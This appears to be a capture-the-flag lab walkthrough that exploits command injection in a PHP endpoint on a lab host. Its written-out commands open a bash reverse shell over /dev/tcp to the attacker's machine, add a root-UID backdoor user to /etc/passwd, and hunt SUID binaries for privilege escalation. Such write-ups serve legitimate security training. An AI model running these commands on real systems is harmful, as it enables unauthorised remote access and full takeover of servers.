
# Remote Code Execution Exploitation - Walkthrough

## **1. Initial Reconnaissance**

### **Vulnerability Analysis:**
During the initial exploration of the server, I noticed that user inputs were passed directly to system commands without proper sanitization. This allowed for a potential **Remote Code Execution (RCE)** vulnerability, which could be exploited by appending system commands to the parameters of the server’s web requests.

### **Objective:**
The goal is to leverage this RCE vulnerability to gain unauthorized access to the server’s underlying operating system, perform directory listings, access sensitive files, and ultimately escalate privileges to root.

---

## **2. Testing for RCE**

The first step was to determine whether arbitrary system commands could be executed by passing parameters to the web application.

### **Request Example:**
```bash
curl "http://10.10.35.53/assets/index.php?cmd=whoami"
```

### **Analysis:**
- The server responds with Base64-encoded data, which suggests that any output from executed commands is being sanitized before being returned to the client. 
- To decode the output, use the following command:
```bash
echo 'aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==' | base64 -d
```

---

## **3. Executing Arbitrary Commands**

With command execution confirmed, I attempted to gather more information about the system by listing directories and files:

### **Command:**
```bash
curl "http://10.10.35.53/assets/index.php?cmd=ls"
```

### **Decoded Output:**
```
images/
index.php
styles.css
```

- The output reveals the structure of the server’s current directory. The key file of interest is `index.php`, which is likely handling the command execution.

### **System Behavior:**
The encoding of the output in Base64 suggests that the server may be attempting to obscure the execution of system commands, possibly to prevent direct injection or to sanitize potentially dangerous characters. 

---

## **4. Further Exploitation - Attempting Reverse Shell**

At this stage, I decided to attempt a reverse shell to gain interactive access to the server. Using the tool [RevShells](https://www.revshells.com/), I generated the appropriate payload to open a reverse connection to my machine.

### **Reverse Shell Setup:**
1. Generate a reverse shell payload with the target IP and port.
2. Execute the following payload:
```bash
curl "http://10.10.35.53/assets/index.php?cmd=bash -c 'bash -i >& /dev/tcp/[YOUR_IP]/[YOUR_PORT] 0>&1'"
```

Once executed, the reverse shell was successfully established, providing direct access as the `www-data` user.

---

## **5. Privilege Escalation to Root**

### **Method 1: Writing to `/etc/passwd`**

To escalate privileges, the first method involved adding a new user to `/etc/passwd` with root-level privileges.

1. First, generate a password hash using the `mkpasswd` tool:
```bash
mkpasswd -m md5crypt -s
```

- The `-m md5crypt` argument specifies the hashing algorithm to be used (MD5Crypt in this case), while `-s` prompts for the password securely.

2. Once the password hash is generated, inject a new user entry into `/etc/passwd`:
```bash
hakal:$1$Dhk.lMO1$nJeZfbQNSMUbSRAwkNzuk0:0:0:hakal:/root:/bin/bash
```

- This entry defines a new user `hakal` with root privileges (`UID=0`), using `/bin/bash` as the shell.

### **Method 2: Obtaining Root Access through SUID Binaries**

Another approach involved searching for binaries with the **SUID** bit set. By listing all files with SUID permissions:
```bash
find / -perm -u=s -type f 2>/dev/null
```

- Executing one of these SUID binaries as the `www-data` user allowed for privilege escalation, granting root-level access to the system.

---

## **6. Conclusion**

Regardless of the method chosen, it is possible to exploit the RCE vulnerability and escalate privileges to root. The final step involves capturing the root flag, marking the successful exploitation of the system.

### **Flag:**
```bash
cat /root/flag.txt
```

The exploitation walkthrough concludes here, with a successful root compromise of the vulnerable server.

